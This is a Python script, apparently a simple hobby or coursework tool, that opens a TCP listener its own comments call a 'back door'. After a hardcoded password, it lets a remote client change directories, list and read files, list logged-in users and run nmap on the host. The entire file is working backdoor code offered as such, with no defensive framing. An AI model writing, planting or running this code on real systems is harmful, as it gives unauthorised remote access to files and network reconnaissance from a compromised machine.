import socket
import sys
import subprocess
import os

#array of all commands
correctCmd = ["pwd", "cd", "ls", "cat", "help", "off", "nmap", "who"]
#holds the original directory to default back to
directory = os.getcwd()
#string of all commands
helpString = "  exit\t-closes the current connection\n  pwd\t-returns current working directory\n  cd\t-changes current working directory\n  ls\t-list files in current directory\n  cat\t-return contents of file\n  off\t-stop the back door\n  nmap\t-run nmap with parameters\n  who\t-list all logged in users"

#runs the user specified command
def runCmd(cmd):
	cmdType = cmd.split()[0]
	cmd = cmd.split()
	if cmdType in correctCmd:									#ensure command is in list
	
		if cmdType == "pwd":										#returns current working directory
			result = os.getcwd()
			
		elif cmdType == "cd":										#changes directory
			try:
				os.chdir(cmd[1])
				result = "OK"
			except FileNotFoundError:
				result = "No such file or directory: '" + cmd[1] + "'"
			except IndexError:
				result = "please provide a directory to change to"
				
		elif cmdType == "ls":											#returns files in current folder
			try:
				result = subprocess.check_output(cmd)
				result = result.decode('utf-8')
			except subprocess.CalledProcessError:
				result = "please ensure all parameters are proper parameters that function with ls"
				
		elif cmdType == "cat":										#returns file specified by parameter
			try:
				with open(os.getcwd() + "/" + cmd[1], 'r') as f:
					result = f.read()
			except FileNotFoundError:
				result = "no such file exists in the current directory"
				
		elif cmdType == "help":											#returns a list of valid commands
			result = helpString
				
		elif cmdType == "off":											#shuts down the back door
			result = "shutting down...\n"
			
		elif cmdType == "nmap":											#runs nmap with specified parameters	
			try:
				result = subprocess.check_output(cmd)
				result = result.decode('utf-8')
			except subprocess.CalledProcessError:
				result = "nmap requires correct params to function"
				
		elif cmdType == "who":											#returns all logged in users
			result = subprocess.check_output('w')
			result = result.decode('utf-8')
			
		else:																				#catch all just in case
			result = "you are garbage"
			
	else:																					#if not valid command, reject
		result = "command not in list of valid commands"
	return result.rstrip()


#main function to run the program
def main():
	try:
		port = int(sys.argv[1])
	except:
		print("Please ensure run command is 'python bServer.py port##'")
		quit()

	sSocket = socket.socket( socket.AF_INET, socket.SOCK_STREAM)
	sSocket.bind((socket.gethostname(), port))
	sSocket.listen(0)
	print("Listening at " + socket.gethostbyname(socket.gethostname()) + " on port " + str(port) + "...")

	#loop to continue to accept connections
	while 1:
		(cSocket, addr) = sSocket.accept()
		print("connection received from " + str(addr))
		print("sending challenge...")
		#cSocket.send(b"password?\n")
		cmd = (str(cSocket.recv(64), 'utf-8')).rstrip()
		if cmd == "password":
			cSocket.send(bytes("correct password received\n" + os.getcwd() + "> ", 'utf-8'))
		else:
			cSocket.send(b"Denied. Closing connection...")
			cSocket.close()
			cmd = "exit"
		
		#loop to accept commands from user
		while cmd != "exit":
			cmd = (str(cSocket.recv(64), 'utf-8')).rstrip()
			print("received command '" + cmd + "'")
			if cmd == "off":
				res = runCmd(cmd)
				cSocket.send(bytes(res + "\n", 'utf-8'))
				cSocket.close()
				sSocket.close()
				quit()
			elif cmd != "" and cmd != "exit":
				res = runCmd(cmd)
				cSocket.send(bytes(res + "\n" + os.getcwd() + "> ", 'utf-8'))
		cSocket.close()
		print("connection to " + str(addr) + " was closed")
		os.chdir(directory)
		
		
main()

  
